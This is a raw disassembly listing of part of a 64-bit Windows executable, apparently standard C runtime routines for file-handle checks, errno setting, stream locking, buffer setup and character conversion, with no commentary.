   140007a53:	48 8b f3             	mov    %rbx,%rsi
   140007a56:	4c 8b f3             	mov    %rbx,%r14
   140007a59:	49 c1 fe 05          	sar    $0x5,%r14
   140007a5d:	4c 8d 3d 1c eb 00 00 	lea    0xeb1c(%rip),%r15        # 0x140016580
   140007a64:	83 e6 1f             	and    $0x1f,%esi
   140007a67:	48 6b f6 58          	imul   $0x58,%rsi,%rsi
   140007a6b:	4b 8b 04 f7          	mov    (%r15,%r14,8),%rax
   140007a6f:	0f be 4c 30 08       	movsbl 0x8(%rax,%rsi,1),%ecx
   140007a74:	83 e1 01             	and    $0x1,%ecx
   140007a77:	75 2b                	jne    0x140007aa4
   140007a79:	e8 46 b6 ff ff       	call   0x1400030c4
   140007a7e:	89 38                	mov    %edi,(%rax)
   140007a80:	e8 1f b6 ff ff       	call   0x1400030a4
   140007a85:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140007a8b:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140007a90:	45 33 c9             	xor    %r9d,%r9d
   140007a93:	45 33 c0             	xor    %r8d,%r8d
   140007a96:	33 d2                	xor    %edx,%edx
   140007a98:	33 c9                	xor    %ecx,%ecx
   140007a9a:	e8 35 b5 ff ff       	call   0x140002fd4
   140007a9f:	83 c8 ff             	or     $0xffffffff,%eax
   140007aa2:	eb 6d                	jmp    0x140007b11
   140007aa4:	8b cb                	mov    %ebx,%ecx
   140007aa6:	e8 c5 1a 00 00       	call   0x140009570
   140007aab:	90                   	nop
   140007aac:	4b 8b 04 f7          	mov    (%r15,%r14,8),%rax
   140007ab0:	f6 44 30 08 01       	testb  $0x1,0x8(%rax,%rsi,1)
   140007ab5:	74 11                	je     0x140007ac8
   140007ab7:	45 8b c4             	mov    %r12d,%r8d
   140007aba:	49 8b d5             	mov    %r13,%rdx
   140007abd:	8b cb                	mov    %ebx,%ecx
   140007abf:	e8 d4 f7 ff ff       	call   0x140007298
   140007ac4:	8b f8                	mov    %eax,%edi
   140007ac6:	eb 15                	jmp    0x140007add
   140007ac8:	e8 d7 b5 ff ff       	call   0x1400030a4
   140007acd:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140007ad3:	e8 ec b5 ff ff       	call   0x1400030c4
   140007ad8:	89 38                	mov    %edi,(%rax)
   140007ada:	83 cf ff             	or     $0xffffffff,%edi
   140007add:	8b cb                	mov    %ebx,%ecx
   140007adf:	e8 34 1b 00 00       	call   0x140009618
   140007ae4:	8b c7                	mov    %edi,%eax
   140007ae6:	eb 29                	jmp    0x140007b11
   140007ae8:	e8 d7 b5 ff ff       	call   0x1400030c4
   140007aed:	89 38                	mov    %edi,(%rax)
   140007aef:	e8 b0 b5 ff ff       	call   0x1400030a4
   140007af4:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140007afa:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140007aff:	45 33 c9             	xor    %r9d,%r9d
   140007b02:	45 33 c0             	xor    %r8d,%r8d
   140007b05:	33 d2                	xor    %edx,%edx
   140007b07:	33 c9                	xor    %ecx,%ecx
   140007b09:	e8 c6 b4 ff ff       	call   0x140002fd4
   140007b0e:	83 c8 ff             	or     $0xffffffff,%eax
   140007b11:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140007b16:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140007b1b:	48 83 c4 30          	add    $0x30,%rsp
   140007b1f:	41 5f                	pop    %r15
   140007b21:	41 5e                	pop    %r14
   140007b23:	41 5d                	pop    %r13
   140007b25:	41 5c                	pop    %r12
   140007b27:	5f                   	pop    %rdi
   140007b28:	c3                   	ret
   140007b29:	cc                   	int3
   140007b2a:	cc                   	int3
   140007b2b:	cc                   	int3
   140007b2c:	40 53                	rex push %rbx
   140007b2e:	48 83 ec 20          	sub    $0x20,%rsp
   140007b32:	ff 05 28 d8 00 00    	incl   0xd828(%rip)        # 0x140015360
   140007b38:	48 8b d9             	mov    %rcx,%rbx
   140007b3b:	b9 00 10 00 00       	mov    $0x1000,%ecx
   140007b40:	e8 ff e2 ff ff       	call   0x140005e44
   140007b45:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140007b49:	48 85 c0             	test   %rax,%rax
   140007b4c:	74 0d                	je     0x140007b5b
   140007b4e:	83 4b 18 08          	orl    $0x8,0x18(%rbx)
   140007b52:	c7 43 24 00 10 00 00 	movl   $0x1000,0x24(%rbx)
   140007b59:	eb 13                	jmp    0x140007b6e
   140007b5b:	83 4b 18 04          	orl    $0x4,0x18(%rbx)
   140007b5f:	48 8d 43 20          	lea    0x20(%rbx),%rax
   140007b63:	c7 43 24 02 00 00 00 	movl   $0x2,0x24(%rbx)
   140007b6a:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140007b6e:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140007b72:	83 63 08 00          	andl   $0x0,0x8(%rbx)
   140007b76:	48 89 03             	mov    %rax,(%rbx)
   140007b79:	48 83 c4 20          	add    $0x20,%rsp
   140007b7d:	5b                   	pop    %rbx
   140007b7e:	c3                   	ret
   140007b7f:	cc                   	int3
   140007b80:	48 83 ec 38          	sub    $0x38,%rsp
   140007b84:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   140007b87:	75 0d                	jne    0x140007b96
   140007b89:	e8 16 b5 ff ff       	call   0x1400030a4
   140007b8e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140007b94:	eb 52                	jmp    0x140007be8
   140007b96:	85 c9                	test   %ecx,%ecx
   140007b98:	78 2e                	js     0x140007bc8
   140007b9a:	3b 0d c8 e9 00 00    	cmp    0xe9c8(%rip),%ecx        # 0x140016568
   140007ba0:	73 26                	jae    0x140007bc8
   140007ba2:	48 63 c9             	movslq %ecx,%rcx
   140007ba5:	48 8d 15 d4 e9 00 00 	lea    0xe9d4(%rip),%rdx        # 0x140016580
   140007bac:	48 8b c1             	mov    %rcx,%rax
   140007baf:	83 e1 1f             	and    $0x1f,%ecx
   140007bb2:	48 c1 f8 05          	sar    $0x5,%rax
   140007bb6:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   140007bba:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   140007bbe:	0f be 44 08 08       	movsbl 0x8(%rax,%rcx,1),%eax
   140007bc3:	83 e0 40             	and    $0x40,%eax
   140007bc6:	eb 22                	jmp    0x140007bea
   140007bc8:	e8 d7 b4 ff ff       	call   0x1400030a4
   140007bcd:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140007bd3:	45 33 c9             	xor    %r9d,%r9d
   140007bd6:	45 33 c0             	xor    %r8d,%r8d
   140007bd9:	33 d2                	xor    %edx,%edx
   140007bdb:	33 c9                	xor    %ecx,%ecx
   140007bdd:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140007be3:	e8 ec b3 ff ff       	call   0x140002fd4
   140007be8:	33 c0                	xor    %eax,%eax
   140007bea:	48 83 c4 38          	add    $0x38,%rsp
   140007bee:	c3                   	ret
   140007bef:	cc                   	int3
   140007bf0:	48 8d 05 59 c1 00 00 	lea    0xc159(%rip),%rax        # 0x140013d50
   140007bf7:	c3                   	ret
   140007bf8:	40 53                	rex push %rbx
   140007bfa:	48 83 ec 20          	sub    $0x20,%rsp
   140007bfe:	8b 05 5c e9 00 00    	mov    0xe95c(%rip),%eax        # 0x140016560
   140007c04:	bb 14 00 00 00       	mov    $0x14,%ebx
   140007c09:	85 c0                	test   %eax,%eax
   140007c0b:	75 07                	jne    0x140007c14
   140007c0d:	b8 00 02 00 00       	mov    $0x200,%eax
   140007c12:	eb 05                	jmp    0x140007c19
   140007c14:	3b c3                	cmp    %ebx,%eax
   140007c16:	0f 4c c3             	cmovl  %ebx,%eax
   140007c19:	48 63 c8             	movslq %eax,%rcx
   140007c1c:	ba 08 00 00 00       	mov    $0x8,%edx
   140007c21:	89 05 39 e9 00 00    	mov    %eax,0xe939(%rip)        # 0x140016560
   140007c27:	e8 84 e2 ff ff       	call   0x140005eb0
   140007c2c:	48 89 05 0d d9 00 00 	mov    %rax,0xd90d(%rip)        # 0x140015540
   140007c33:	48 85 c0             	test   %rax,%rax
   140007c36:	75 24                	jne    0x140007c5c
   140007c38:	8d 50 08             	lea    0x8(%rax),%edx
   140007c3b:	48 8b cb             	mov    %rbx,%rcx
   140007c3e:	89 1d 1c e9 00 00    	mov    %ebx,0xe91c(%rip)        # 0x140016560
   140007c44:	e8 67 e2 ff ff       	call   0x140005eb0
   140007c49:	48 89 05 f0 d8 00 00 	mov    %rax,0xd8f0(%rip)        # 0x140015540
   140007c50:	48 85 c0             	test   %rax,%rax
   140007c53:	75 07                	jne    0x140007c5c
   140007c55:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140007c5a:	eb 78                	jmp    0x140007cd4
   140007c5c:	33 c9                	xor    %ecx,%ecx
   140007c5e:	48 8d 15 eb c0 00 00 	lea    0xc0eb(%rip),%rdx        # 0x140013d50
   140007c65:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   140007c69:	48 83 c2 30          	add    $0x30,%rdx
   140007c6d:	48 83 c1 08          	add    $0x8,%rcx
   140007c71:	48 83 eb 01          	sub    $0x1,%rbx
   140007c75:	74 09                	je     0x140007c80
   140007c77:	48 8b 05 c2 d8 00 00 	mov    0xd8c2(%rip),%rax        # 0x140015540
   140007c7e:	eb e5                	jmp    0x140007c65
   140007c80:	45 33 c0             	xor    %r8d,%r8d
   140007c83:	48 8d 15 e2 c0 00 00 	lea    0xc0e2(%rip),%rdx        # 0x140013d6c
   140007c8a:	45 8d 48 03          	lea    0x3(%r8),%r9d
   140007c8e:	49 8b c8             	mov    %r8,%rcx
   140007c91:	4c 8d 15 e8 e8 00 00 	lea    0xe8e8(%rip),%r10        # 0x140016580
   140007c98:	49 8b c0             	mov    %r8,%rax
   140007c9b:	48 c1 f8 05          	sar    $0x5,%rax
   140007c9f:	83 e1 1f             	and    $0x1f,%ecx
   140007ca2:	49 8b 04 c2          	mov    (%r10,%rax,8),%rax
   140007ca6:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   140007caa:	4c 8b 14 01          	mov    (%rcx,%rax,1),%r10
   140007cae:	49 83 fa ff          	cmp    $0xffffffffffffffff,%r10
   140007cb2:	74 0b                	je     0x140007cbf
   140007cb4:	49 83 fa fe          	cmp    $0xfffffffffffffffe,%r10
   140007cb8:	74 05                	je     0x140007cbf
   140007cba:	4d 85 d2             	test   %r10,%r10
   140007cbd:	75 06                	jne    0x140007cc5
   140007cbf:	c7 02 fe ff ff ff    	movl   $0xfffffffe,(%rdx)
   140007cc5:	49 ff c0             	inc    %r8
   140007cc8:	48 83 c2 30          	add    $0x30,%rdx
   140007ccc:	49 83 e9 01          	sub    $0x1,%r9
   140007cd0:	75 bc                	jne    0x140007c8e
   140007cd2:	33 c0                	xor    %eax,%eax
   140007cd4:	48 83 c4 20          	add    $0x20,%rsp
   140007cd8:	5b                   	pop    %rbx
   140007cd9:	c3                   	ret
   140007cda:	cc                   	int3
   140007cdb:	cc                   	int3
   140007cdc:	48 83 ec 28          	sub    $0x28,%rsp
   140007ce0:	e8 53 1e 00 00       	call   0x140009b38
   140007ce5:	80 3d 1c c9 00 00 00 	cmpb   $0x0,0xc91c(%rip)        # 0x140014608
   140007cec:	74 05                	je     0x140007cf3
   140007cee:	e8 dd 1b 00 00       	call   0x1400098d0
   140007cf3:	48 8b 0d 46 d8 00 00 	mov    0xd846(%rip),%rcx        # 0x140015540
   140007cfa:	48 83 c4 28          	add    $0x28,%rsp
   140007cfe:	e9 15 ad ff ff       	jmp    0x140002a18
   140007d03:	cc                   	int3
   140007d04:	40 53                	rex push %rbx
   140007d06:	48 83 ec 20          	sub    $0x20,%rsp
   140007d0a:	48 8b d9             	mov    %rcx,%rbx
   140007d0d:	48 8d 0d 3c c0 00 00 	lea    0xc03c(%rip),%rcx        # 0x140013d50
   140007d14:	48 3b d9             	cmp    %rcx,%rbx
   140007d17:	72 3a                	jb     0x140007d53
   140007d19:	48 8d 05 c0 c3 00 00 	lea    0xc3c0(%rip),%rax        # 0x1400140e0
   140007d20:	48 3b d8             	cmp    %rax,%rbx
   140007d23:	77 2e                	ja     0x140007d53
   140007d25:	48 8b d3             	mov    %rbx,%rdx
   140007d28:	48 b8 ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%rax
   140007d2f:	aa aa 2a 
   140007d32:	48 2b d1             	sub    %rcx,%rdx
   140007d35:	48 f7 ea             	imul   %rdx
   140007d38:	48 c1 fa 03          	sar    $0x3,%rdx
   140007d3c:	48 8b ca             	mov    %rdx,%rcx
   140007d3f:	48 c1 e9 3f          	shr    $0x3f,%rcx
   140007d43:	8d 4c 11 10          	lea    0x10(%rcx,%rdx,1),%ecx
   140007d47:	e8 20 bf ff ff       	call   0x140003c6c
   140007d4c:	0f ba 6b 18 0f       	btsl   $0xf,0x18(%rbx)
   140007d51:	eb 0a                	jmp    0x140007d5d
   140007d53:	48 8d 4b 30          	lea    0x30(%rbx),%rcx
   140007d57:	ff 15 6b 64 00 00    	call   *0x646b(%rip)        # 0x14000e1c8
   140007d5d:	48 83 c4 20          	add    $0x20,%rsp
   140007d61:	5b                   	pop    %rbx
   140007d62:	c3                   	ret
   140007d63:	cc                   	int3
   140007d64:	40 53                	rex push %rbx
   140007d66:	48 83 ec 20          	sub    $0x20,%rsp
   140007d6a:	83 f9 14             	cmp    $0x14,%ecx
   140007d6d:	48 8b da             	mov    %rdx,%rbx
   140007d70:	7d 0f                	jge    0x140007d81
   140007d72:	83 c1 10             	add    $0x10,%ecx
   140007d75:	e8 f2 be ff ff       	call   0x140003c6c
   140007d7a:	0f ba 6b 18 0f       	btsl   $0xf,0x18(%rbx)
   140007d7f:	eb 0a                	jmp    0x140007d8b
   140007d81:	48 8d 4a 30          	lea    0x30(%rdx),%rcx
   140007d85:	ff 15 3d 64 00 00    	call   *0x643d(%rip)        # 0x14000e1c8
   140007d8b:	48 83 c4 20          	add    $0x20,%rsp
   140007d8f:	5b                   	pop    %rbx
   140007d90:	c3                   	ret
   140007d91:	cc                   	int3
   140007d92:	cc                   	int3
   140007d93:	cc                   	int3
   140007d94:	48 83 ec 28          	sub    $0x28,%rsp
   140007d98:	48 8d 15 b1 bf 00 00 	lea    0xbfb1(%rip),%rdx        # 0x140013d50
   140007d9f:	48 3b ca             	cmp    %rdx,%rcx
   140007da2:	72 37                	jb     0x140007ddb
   140007da4:	48 8d 05 35 c3 00 00 	lea    0xc335(%rip),%rax        # 0x1400140e0
   140007dab:	48 3b c8             	cmp    %rax,%rcx
   140007dae:	77 2b                	ja     0x140007ddb
   140007db0:	0f ba 71 18 0f       	btrl   $0xf,0x18(%rcx)
   140007db5:	48 2b ca             	sub    %rdx,%rcx
   140007db8:	48 b8 ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%rax
   140007dbf:	aa aa 2a 
   140007dc2:	48 f7 e9             	imul   %rcx
   140007dc5:	48 c1 fa 03          	sar    $0x3,%rdx
   140007dc9:	48 8b ca             	mov    %rdx,%rcx
   140007dcc:	48 c1 e9 3f          	shr    $0x3f,%rcx
   140007dd0:	8d 4c 11 10          	lea    0x10(%rcx,%rdx,1),%ecx
   140007dd4:	e8 93 bd ff ff       	call   0x140003b6c
   140007dd9:	eb 0a                	jmp    0x140007de5
   140007ddb:	48 83 c1 30          	add    $0x30,%rcx
   140007ddf:	ff 15 db 63 00 00    	call   *0x63db(%rip)        # 0x14000e1c0
   140007de5:	48 83 c4 28          	add    $0x28,%rsp
   140007de9:	c3                   	ret
   140007dea:	cc                   	int3
   140007deb:	cc                   	int3
   140007dec:	48 83 ec 28          	sub    $0x28,%rsp
   140007df0:	83 f9 14             	cmp    $0x14,%ecx
   140007df3:	7d 0f                	jge    0x140007e04
   140007df5:	0f ba 72 18 0f       	btrl   $0xf,0x18(%rdx)
   140007dfa:	83 c1 10             	add    $0x10,%ecx
   140007dfd:	e8 6a bd ff ff       	call   0x140003b6c
   140007e02:	eb 0a                	jmp    0x140007e0e
   140007e04:	48 8d 4a 30          	lea    0x30(%rdx),%rcx
   140007e08:	ff 15 b2 63 00 00    	call   *0x63b2(%rip)        # 0x14000e1c0
   140007e0e:	48 83 c4 28          	add    $0x28,%rsp
   140007e12:	c3                   	ret
   140007e13:	cc                   	int3
   140007e14:	48 83 ec 38          	sub    $0x38,%rsp
   140007e18:	48 85 c9             	test   %rcx,%rcx
   140007e1b:	75 25                	jne    0x140007e42
   140007e1d:	e8 82 b2 ff ff       	call   0x1400030a4
   140007e22:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140007e28:	45 33 c9             	xor    %r9d,%r9d
   140007e2b:	45 33 c0             	xor    %r8d,%r8d
   140007e2e:	33 d2                	xor    %edx,%edx
   140007e30:	33 c9                	xor    %ecx,%ecx
   140007e32:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140007e38:	e8 97 b1 ff ff       	call   0x140002fd4
   140007e3d:	83 c8 ff             	or     $0xffffffff,%eax
   140007e40:	eb 03                	jmp    0x140007e45
   140007e42:	8b 41 1c             	mov    0x1c(%rcx),%eax
   140007e45:	48 83 c4 38          	add    $0x38,%rsp
   140007e49:	c3                   	ret
   140007e4a:	cc                   	int3
   140007e4b:	cc                   	int3
   140007e4c:	40 53                	rex push %rbx
   140007e4e:	48 83 ec 40          	sub    $0x40,%rsp
   140007e52:	8b d9                	mov    %ecx,%ebx
   140007e54:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007e59:	e8 22 c8 ff ff       	call   0x140004680
   140007e5e:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007e63:	44 0f b6 db          	movzbl %bl,%r11d
   140007e67:	48 8b 88 40 01 00 00 	mov    0x140(%rax),%rcx
   140007e6e:	42 0f b7 04 59       	movzwl (%rcx,%r11,2),%eax
   140007e73:	25 00 80 00 00       	and    $0x8000,%eax
   140007e78:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140007e7d:	74 0c                	je     0x140007e8b
   140007e7f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140007e84:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140007e8b:	48 83 c4 40          	add    $0x40,%rsp
   140007e8f:	5b                   	pop    %rbx
   140007e90:	c3                   	ret
   140007e91:	cc                   	int3
   140007e92:	cc                   	int3
   140007e93:	cc                   	int3
   140007e94:	40 53                	rex push %rbx
   140007e96:	48 83 ec 40          	sub    $0x40,%rsp
   140007e9a:	8b d9                	mov    %ecx,%ebx
   140007e9c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007ea1:	33 d2                	xor    %edx,%edx
   140007ea3:	e8 d8 c7 ff ff       	call   0x140004680
   140007ea8:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007ead:	44 0f b6 db          	movzbl %bl,%r11d
   140007eb1:	48 8b 88 40 01 00 00 	mov    0x140(%rax),%rcx
   140007eb8:	42 0f b7 04 59       	movzwl (%rcx,%r11,2),%eax
   140007ebd:	25 00 80 00 00       	and    $0x8000,%eax
   140007ec2:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140007ec7:	74 0c                	je     0x140007ed5
   140007ec9:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140007ece:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140007ed5:	48 83 c4 40          	add    $0x40,%rsp
   140007ed9:	5b                   	pop    %rbx
   140007eda:	c3                   	ret
   140007edb:	cc                   	int3
   140007edc:	48 8b 0d 65 b1 00 00 	mov    0xb165(%rip),%rcx        # 0x140013048
   140007ee3:	33 c0                	xor    %eax,%eax
   140007ee5:	48 83 c9 01          	or     $0x1,%rcx
   140007ee9:	48 39 0d 78 d4 00 00 	cmp    %rcx,0xd478(%rip)        # 0x140015368
   140007ef0:	0f 94 c0             	sete   %al
   140007ef3:	c3                   	ret
   140007ef4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007ef9:	66 44 89 4c 24 20    	mov    %r9w,0x20(%rsp)
   140007eff:	55                   	push   %rbp
   140007f00:	56                   	push   %rsi
   140007f01:	57                   	push   %rdi
   140007f02:	48 83 ec 60          	sub    $0x60,%rsp
   140007f06:	33 ed                	xor    %ebp,%ebp
   140007f08:	49 8b f8             	mov    %r8,%rdi
   140007f0b:	48 8b f2             	mov    %rdx,%rsi
   140007f0e:	48 8b d9             	mov    %rcx,%rbx
   140007f11:	48 3b d5             	cmp    %rbp,%rdx
   140007f14:	75 13                	jne    0x140007f29
   140007f16:	4c 3b c5             	cmp    %rbp,%r8
   140007f19:	76 0e                	jbe    0x140007f29
   140007f1b:	48 3b cd             	cmp    %rbp,%rcx
   140007f1e:	74 02                	je     0x140007f22
   140007f20:	89 29                	mov    %ebp,(%rcx)
   140007f22:	33 c0                	xor    %eax,%eax
   140007f24:	e9 a4 00 00 00       	jmp    0x140007fcd
   140007f29:	48 3b cd             	cmp    %rbp,%rcx
   140007f2c:	74 03                	je     0x140007f31
   140007f2e:	83 09 ff             	orl    $0xffffffff,(%rcx)
   140007f31:	49 81 f8 ff ff ff 7f 	cmp    $0x7fffffff,%r8
   140007f38:	76 24                	jbe    0x140007f5e
   140007f3a:	e8 65 b1 ff ff       	call   0x1400030a4
   140007f3f:	bb 16 00 00 00       	mov    $0x16,%ebx
   140007f44:	45 33 c9             	xor    %r9d,%r9d
   140007f47:	45 33 c0             	xor    %r8d,%r8d
   140007f4a:	33 d2                	xor    %edx,%edx
   140007f4c:	33 c9                	xor    %ecx,%ecx
   140007f4e:	89 18                	mov    %ebx,(%rax)
   140007f50:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140007f55:	e8 7a b0 ff ff       	call   0x140002fd4
   140007f5a:	8b c3                	mov    %ebx,%eax
   140007f5c:	eb 6f                	jmp    0x140007fcd
   140007f5e:	48 8b 94 24 a0 00 00 	mov    0xa0(%rsp),%rdx
   140007f65:	00 
   140007f66:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007f6b:	e8 10 c7 ff ff       	call   0x140004680
   140007f70:	4c 8b 5c 24 40       	mov    0x40(%rsp),%r11
   140007f75:	41 39 6b 14          	cmp    %ebp,0x14(%r11)
   140007f79:	0f 85 cd 00 00 00    	jne    0x14000804c
   140007f7f:	0f b7 84 24 98 00 00 	movzwl 0x98(%rsp),%eax
   140007f86:	00 
   140007f87:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140007f8c:	66 3b c1             	cmp    %cx,%ax
   140007f8f:	76 4c                	jbe    0x140007fdd
   140007f91:	48 3b f5             	cmp    %rbp,%rsi
   140007f94:	74 12                	je     0x140007fa8
   140007f96:	48 3b fd             	cmp    %rbp,%rdi
   140007f99:	76 0d                	jbe    0x140007fa8
   140007f9b:	4c 8b c7             	mov    %rdi,%r8
   140007f9e:	33 d2                	xor    %edx,%edx
   140007fa0:	48 8b ce             	mov    %rsi,%rcx
   140007fa3:	e8 c8 aa ff ff       	call   0x140002a70
   140007fa8:	e8 f7 b0 ff ff       	call   0x1400030a4
   140007fad:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   140007fb3:	e8 ec b0 ff ff       	call   0x1400030a4
   140007fb8:	8b 00                	mov    (%rax),%eax
   140007fba:	40 38 6c 24 58       	cmp    %bpl,0x58(%rsp)
   140007fbf:	74 0c                	je     0x140007fcd
   140007fc1:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140007fc6:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140007fcd:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140007fd4:	00 
   140007fd5:	48 83 c4 60          	add    $0x60,%rsp
   140007fd9:	5f                   	pop    %rdi
   140007fda:	5e                   	pop    %rsi
   140007fdb:	5d                   	pop    %rbp
   140007fdc:	c3                   	ret
   140007fdd:	48 3b f5             	cmp    %rbp,%rsi
   140007fe0:	74 43                	je     0x140008025
   140007fe2:	48 3b fd             	cmp    %rbp,%rdi
   140007fe5:	77 3c                	ja     0x140008023
   140007fe7:	e8 b8 b0 ff ff       	call   0x1400030a4
   140007fec:	bb 22 00 00 00       	mov    $0x22,%ebx
   140007ff1:	45 33 c9             	xor    %r9d,%r9d
   140007ff4:	45 33 c0             	xor    %r8d,%r8d
   140007ff7:	33 d2                	xor    %edx,%edx
   140007ff9:	33 c9                	xor    %ecx,%ecx
   140007ffb:	89 18                	mov    %ebx,(%rax)
   140007ffd:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140008002:	e8 cd af ff ff       	call   0x140002fd4
   140008007:	40 38 6c 24 58       	cmp    %bpl,0x58(%rsp)
   14000800c:	0f 84 48 ff ff ff    	je     0x140007f5a
   140008012:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140008017:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   14000801e:	e9 37 ff ff ff       	jmp    0x140007f5a
   140008023:	88 06                	mov    %al,(%rsi)
   140008025:	48 3b dd             	cmp    %rbp,%rbx
   140008028:	74 06                	je     0x140008030
   14000802a:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   140008030:	40 38 6c 24 58       	cmp    %bpl,0x58(%rsp)
   140008035:	0f 84 e7 fe ff ff    	je     0x140007f22
   14000803b:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140008040:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   140008047:	e9 d6 fe ff ff       	jmp    0x140007f22
   14000804c:	48 8d 84 24 88 00 00 	lea    0x88(%rsp),%rax
   140008053:	00 
   140008054:	89 ac 24 88 00 00 00 	mov    %ebp,0x88(%rsp)
   14000805b:	41 8b 4b 04          	mov    0x4(%r11),%ecx
   14000805f:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140008064:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140008069:	4c 8d 84 24 98 00 00 	lea    0x98(%rsp),%r8
   140008070:	00 
   140008071:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140008077:	33 d2                	xor    %edx,%edx
   140008079:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   14000807d:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140008082:	ff 15 70 61 00 00    	call   *0x6170(%rip)        # 0x14000e1f8
   140008088:	3b c5                	cmp    %ebp,%eax
   14000808a:	74 16                	je     0x1400080a2
   14000808c:	39 ac 24 88 00 00 00 	cmp    %ebp,0x88(%rsp)
   140008093:	0f 85 0f ff ff ff    	jne    0x140007fa8
   140008099:	48 3b dd             	cmp    %rbp,%rbx
   14000809c:	74 92                	je     0x140008030
   14000809e:	89 03                	mov    %eax,(%rbx)
   1400080a0:	eb 8e                	jmp    0x140008030
   1400080a2:	ff 15 a8 5f 00 00    	call   *0x5fa8(%rip)        # 0x14000e050
   1400080a8:	83 f8 7a             	cmp    $0x7a,%eax
   1400080ab:	0f 85 f7 fe ff ff    	jne    0x140007fa8
   1400080b1:	48 3b f5             	cmp    %rbp,%rsi
   1400080b4:	74 12                	je     0x1400080c8
   1400080b6:	48 3b fd             	cmp    %rbp,%rdi
   1400080b9:	76 0d                	jbe    0x1400080c8
   1400080bb:	4c 8b c7             	mov    %rdi,%r8
   1400080be:	33 d2                	xor    %edx,%edx
   1400080c0:	48 8b ce             	mov    %rsi,%rcx
   1400080c3:	e8 a8 a9 ff ff       	call   0x140002a70
   1400080c8:	e8 d7 af ff ff       	call   0x1400030a4
   1400080cd:	bb 22 00 00 00       	mov    $0x22,%ebx
   1400080d2:	45 33 c9             	xor    %r9d,%r9d
   1400080d5:	45 33 c0             	xor    %r8d,%r8d
   1400080d8:	33 d2                	xor    %edx,%edx
   1400080da:	33 c9                	xor    %ecx,%ecx
   1400080dc:	89 18                	mov    %ebx,(%rax)
   1400080de:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400080e3:	e8 ec ae ff ff       	call   0x140002fd4
   1400080e8:	40 38 6c 24 58       	cmp    %bpl,0x58(%rsp)
   1400080ed:	0f 84 67 fe ff ff    	je     0x140007f5a
   1400080f3:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400080f8:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   1400080ff:	e9 56 fe ff ff       	jmp    0x140007f5a
   140008104:	48 83 ec 38          	sub    $0x38,%rsp
   140008108:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000810e:	e8 e1 fd ff ff       	call   0x140007ef4
   140008113:	48 83 c4 38          	add    $0x38,%rsp
   140008117:	c3                   	ret
   140008118:	48 8b c4             	mov    %rsp,%rax
   14000811b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000811f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140008123:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140008127:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000812b:	41 54                	push   %r12
   14000812d:	41 55                	push   %r13
   14000812f:	41 56                	push   %r14
   140008131:	48 83 ec 50          	sub    $0x50,%rsp
   140008135:	4c 8b f2             	mov    %rdx,%r14
   140008138:	48 8b d1             	mov    %rcx,%rdx
   14000813b:	48 8d 48 c8          	lea    -0x38(%rax),%rcx
   14000813f:	45 8b e1             	mov    %r9d,%r12d
   140008142:	4d 8b e8             	mov    %r8,%r13
   140008145:	e8 36 c5 ff ff       	call   0x140004680
   14000814a:	4d 85 ed             	test   %r13,%r13
   14000814d:	74 04                	je     0x140008153
   14000814f:	4d 89 75 00          	mov    %r14,0x0(%r13)
